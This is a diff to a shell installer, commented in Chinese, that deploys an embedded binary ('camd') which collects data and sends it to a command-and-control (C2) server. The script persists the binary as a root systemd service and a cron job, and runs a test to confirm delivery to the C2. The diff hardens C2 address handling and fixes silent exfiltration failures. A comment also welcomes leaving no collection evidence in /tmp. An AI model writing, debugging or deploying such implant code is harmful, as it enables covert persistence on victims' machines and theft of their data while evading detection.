@@ -109,6 +109,27 @@ validate_key() {
     return 0
 }
 
+validate_c2() {
+    # 【实测撞出来的缺陷：sink 缺 tcp:// 前缀会被 camd 当作文件路径】
+    # 实测：camd --sink "127.0.0.1:59999"（无前缀）不连 C2，而是在当前目录
+    # 生成名为 "127.0.0.1:59999" 的 512 字节文件，rc=0 且自报 bytes_out=512。
+    # 后果：驻留起来的 camd 全程不连 C2，只在磁盘上堆"地址:端口"文件，
+    # 而部署全绿、进程在跑、字节在"产出"——是最难发现的一类事故。
+    # 因此三处 sink（单元 / cron / 试运行）都必须显式带 tcp:// 前缀，
+    # 且此处拦截"调用方自己带了前缀"导致的 tcp://tcp:// 双前缀。
+    [ -n "$C2" ] || DIE "C2 地址为空"
+    case "$C2" in
+        tcp://*) DIE "C2 地址不要带 tcp:// 前缀（本脚本会自动加）: $C2" ;;
+        *://*)   DIE "C2 地址只支持 tcp 传输，不支持其它 scheme: $C2" ;;
+    esac
+    # 必须含 host:port 形态。缺端口会被 camd 当纯路径处理。
+    case "$C2" in
+        *:*) : ;;
+        *)   DIE "C2 地址必须是 <host>:<port> 形态（缺端口）: $C2" ;;
+    esac
+    return 0
+}
+
 # ---- 内嵌产物 --------------------------------------------------------------
 # PAYLOAD_BEGIN / PAYLOAD_END 之间由 make_onekey.py 填充 base64。
 # 运行时解码到临时文件，校验 ELF 魔数后才允许安装。
@@ -164,7 +185,7 @@ After=network.target
 [Service]
 Type=simple
 EnvironmentFile=$CONF_FILE
-ExecStart=$BIN_DST --sink \$C2_ADDR --backend \$CAMD_BACKEND
+ExecStart=$BIN_DST --sink tcp://\$C2_ADDR --backend \$CAMD_BACKEND
 Restart=always
 RestartSec=10
 NoNewPrivileges=true
@@ -232,7 +253,7 @@ persist_cron() {
         printf '# managed\n'
         printf 'SHELL=/bin/sh\n'
         printf 'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n'
-        printf '%s * * * * root . %s; %s --sink "$C2_ADDR" --backend "$CAMD_BACKEND"\n' \
+        printf '%s * * * * root . %s; %s --sink "tcp://$C2_ADDR" --backend "$CAMD_BACKEND"\n' \
             "$M" "$CONF_FILE" "$BIN_DST"
     } > "$CRON" 2>/dev/null || { WARN "cron 写入失败"; return 0; }
     chmod 0600 "$CRON" 2>/dev/null
@@ -249,15 +270,29 @@ persist_cron() {
 
 verify_run() {
     # 同步跑一批验证产出：让"装了但采不到"在部署阶段就暴露，而不是等运维发现。
-    OUT=$(mktemp /tmp/.cells-XXXXXX 2>/dev/null) || OUT=/tmp/.cells-$$
-    "$BIN_DST" --sink "$OUT" --backend "$BACKEND" --key "$KEY" \
-               --root "$LIB_DIR/agent" --batches 1 --frames 1 >/dev/null 2>&1
+    #
+    # 【必须用 tcp:// 而非文件 sink —— 这是实测撞出来的缺陷】
+    # 驻留单元里跑的是 `--sink $C2_ADDR`（tcp://）。若试运行改用文件 sink，
+    # 则衡量的是"落盘字节数"而非"送达 C2 的字节数"：文件永远写得成功，
+    # 于是 C2 地址写错 / C2 未启动 / 防火墙拦截时，试运行照样报
+    # "产出 512 字节"全绿通过，而真实驻留进程一条都发不出去。
+    # 实测三场景（有/无 C2 在线）：
+    #   tcp:// + C2 在线  rc=0  C2 实收 512
+    #   tcp:// + C2 离线  rc=6  C2 实收 0    <- 真实失败会被暴露
+    #   file://            rc=0  C2 实收 0    <- 永远"成功"，掩盖故障
+    # 附带收益：不再在 /tmp 落信元文件（那本身是采集证据残留）。
+    RUN_OUT=$("$BIN_DST" --sink "tcp://$C2" --backend "$BACKEND" --key "$KEY" \
+               --root "$LIB_DIR/agent" --batches 1 --frames 1 2>&1)
     RC=$?
-    N=$(wc -c < "$OUT" 2>/dev/null || echo 0)
-    rm -f "$OUT"
-    [ "$RC" -eq 0 ] || { WARN "试运行 rc=$RC（驻留仍在，进程内会重试）"; return 0; }
+    N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
+    [ -n "$N" ] || N=0
+    if [ "$RC" -ne 0 ]; then
+        WARN "试运行未送达 C2（rc=$RC）——C2 可能未启动或地址不可达；驻留仍在，进程内会重试"
+        printf '%s\n' "$RUN_OUT" | sed 's/^/       诊断: /' | head -3
+        return 0
+    fi
     [ "$N" -gt 0 ] || { WARN "试运行产出 0 字节"; return 0; }
-    OK "试运行产出 $N 字节信元"
+    OK "试运行已送达 C2（$N 字节信元，tcp://$C2）"
     return 0
 }
 
@@ -278,6 +313,7 @@ do_install() {
     probe_backend
     gen_key
     validate_key
+    validate_c2
     OK "环境: arch=$ARCH systemd=$HAVE_SYSTEMD backend=$BACKEND"
     extract_bin
     write_conf
